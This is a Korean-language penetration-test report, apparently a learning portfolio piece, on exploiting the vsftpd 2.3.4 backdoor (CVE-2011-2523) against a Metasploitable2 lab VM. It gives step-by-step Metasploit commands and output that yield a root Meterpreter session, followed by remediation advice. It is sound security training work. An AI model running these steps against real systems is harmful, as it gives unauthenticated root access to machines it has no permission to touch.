# 모의해킹 보고서: Metasploitable2 취약점 점검

## 1. 개요 (Executive Summary)

본 보고서는 모의해킹 학습 및 포트폴리오 목적으로, 의도적으로 취약하게 구성된
Metasploitable2 가상머신을 대상으로 수행한 취약점 점검 결과를 정리한 것이다.
점검은 격리된 가상 네트워크 환경에서 진행되었으며, 외부 시스템이나 실제
서비스에 대한 공격은 포함되지 않는다.

점검 결과 FTP 서비스(vsftpd 2.3.4)에서 **Critical 등급의 백도어 취약점**이
발견되었으며, 이를 통해 인증 없이 원격에서 최고 권한(root)을 획득할 수 있음을
확인하였다.

| 구분 | 내용 |
|---|---|
| 점검 대상 | Metasploitable2 (192.168.118.129) |
| 점검 기간 | 2026-10-02 |
| 점검자 | 이기원 |
| 발견 취약점 수 | 1건 (Critical 1) |

---

## 2. 점검 범위 및 환경 (Scope)

### 2.1 대상 시스템
- **Target**: Metasploitable2 (192.168.118.129)
- **Attacker**: Kali Linux 2026.3 (192.168.118.128)

### 2.2 네트워크 구성
- VMware Workstation Pro 17 기반 가상 환경
- Host-only 네트워크(VMnet, 192.168.118.0/24)로 외부 인터넷과 완전히 격리
- 공격자(Kali)와 대상(Metasploitable2)만 동일 네트워크에 연결

```
[Kali Linux]  <----Host-only 네트워크---->  [Metasploitable2]
192.168.118.128                              192.168.118.129
   (공격자)                                      (대상)
```

### 2.3 사용 도구
- Nmap (포트/서비스 스캔)
- Metasploit Framework 6.5.3 (취약점 공격)

---

## 3. 방법론 (Methodology)

1. **정찰 (Reconnaissance)**: ping, nmap을 이용해 대상의 생존 여부 및 열린 포트/서비스 확인
2. **취약점 분석**: 확인된 서비스 버전을 기반으로 알려진 취약점(CVE) 조사
3. **침투 (Exploitation)**: Metasploit을 이용한 취약점 공격 시도
4. **권한 확인 (Post-Exploitation)**: 획득한 세션의 권한 및 시스템 정보 확인
5. **보고 (Reporting)**: 결과 정리 및 대응 방안 도출

---

## 4. 취약점 상세 (Findings)

### 4.1 [Critical] VSFTPD 2.3.4 Backdoor Command Execution

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| CVE | CVE-2011-2523 |
| 대상 | 192.168.118.129:21 (FTP) |
| 사용 모듈 | `exploit/unix/ftp/vsftpd_234_backdoor` |

#### 설명
vsftpd 2.3.4 버전은 2011년 공식 배포 서버가 침해되어, 소스코드에 백도어가
삽입된 악성 버전이 일정 기간 배포된 이력이 있다. 해당 백도어는 FTP 로그인
시도 시 특정 문자열(`:)`)을 username에 포함하면 서버의 6200번 포트에
인증 없는 root 권한 쉘을 여는 방식으로 동작한다.

#### 재현 절차

1. **정찰**: ping으로 대상 생존 확인
   ```
   $ ping 192.168.118.129
   64 bytes from 192.168.118.129: icmp_seq=1 ttl=64 time=1.02 ms
   3 packets transmitted, 3 received, 0% packet loss
   ```
   > <img width="544" height="192" alt="image" src="https://github.com/user-attachments/assets/9b4d0c48-b00a-4094-a0de-5bca6ea60048" />


2. **취약점 식별**: Metasploit 모듈 검색 및 선택
   ```
   msf6 > search vsftpd
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. **옵션 설정**
   ```
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.118.129
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.118.128
   ```

4. **공격 실행**
   ```
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

   [*] 192.168.118.129:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
   [+] 192.168.118.129:21 - The target appears to be vulnerable.
   [+] 192.168.118.129:21 - Backdoor has been spawned!
   [*] Meterpreter session 1 opened (192.168.118.128:4444 -> 192.168.118.129:36529)
   ```
   > <img width="1000" height="140" alt="image" src="https://github.com/user-attachments/assets/1b31437b-b99e-4f12-b424-777641db2163" />


5. **권한 확인**
   ```
   meterpreter > getuid
   meterpreter > sysinfo
   ```
   > <img width="753" height="129" alt="image" src="https://github.com/user-attachments/assets/62ecd4be-f327-4903-ae60-2254b5b97050" />


#### 영향 (Impact)
공격자가 FTP 포트에 대한 단순 접근만으로, 인증 절차 없이 대상 시스템의
**최고 관리자(root) 권한을 원격으로 획득**할 수 있다. 이는 시스템 전체의
완전한 장악(파일 열람/수정/삭제, 추가 악성 행위, 내부망 추가 침투 등)으로
이어질 수 있는 가장 심각한 수준의 취약점이다.

#### 대응 방안 (Remediation)
1. 취약한 vsftpd 2.3.4 버전을 즉시 제거하고 공식 저장소의 최신 버전으로 재설치
2. 소프트웨어 설치 시 체크섬/디지털 서명 검증 절차 도입
3. 외부에 불필요하게 노출된 FTP 서비스는 비활성화하거나 SFTP 등 안전한 대안으로 전환
4. 네트워크 방화벽에서 FTP(21번 포트)에 대한 접근을 신뢰된 IP로 제한

---

## 5. 종합 결론 및 권고사항

| 번호 | 취약점명 | 위험도 | 상태 |
|---|---|---|---|
| 1 | VSFTPD 2.3.4 Backdoor | Critical | 미조치 (연습 환경) |

Metasploitable2는 교육용으로 다수의 취약점이 의도적으로 포함된 시스템으로,
실제 환경에서 이러한 수준의 취약점이 방치되는 경우는 드물다. 그러나 본
점검을 통해 **구버전 소프트웨어 및 검증되지 않은 배포본 사용이 초래할 수
있는 심각한 보안 위험**을 실습을 통해 확인할 수 있었다.

추후 Samba, MySQL, 웹 애플리케이션(DVWA) 등 추가 서비스에 대한 점검을
진행하여 보고서를 확장할 예정이다.

---

## 6. 부록

- Metasploit 모듈: `exploit/unix/ftp/vsftpd_234_backdoor`
- 참고 자료:
  - CVE-2011-2523
  - Rapid7 Metasploitable2 공식 문서
